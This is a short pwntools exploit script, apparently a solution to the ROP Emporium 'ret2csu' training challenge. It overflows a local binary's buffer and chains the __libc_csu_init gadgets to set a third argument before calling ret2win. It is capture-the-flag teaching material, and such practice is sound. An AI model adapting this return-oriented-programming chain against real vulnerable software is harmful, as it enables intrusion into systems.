from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./ret2csu')
elf = ELF('./ret2csu')

p.recvuntil('>')

ret2win = elf.symbols['ret2win']
gadget1 = 0x40089a
gadget2 = 0x400880
fini_p = 0x600e48
arg3 = 0xdeadcafebabebeef

payload = flat(['a'*0x28, gadget1, 0, 1, fini_p, 0, 0, arg3, gadget2,0,0,0,0,0,0,0, ret2win])

p.sendline(payload)
p.interactive()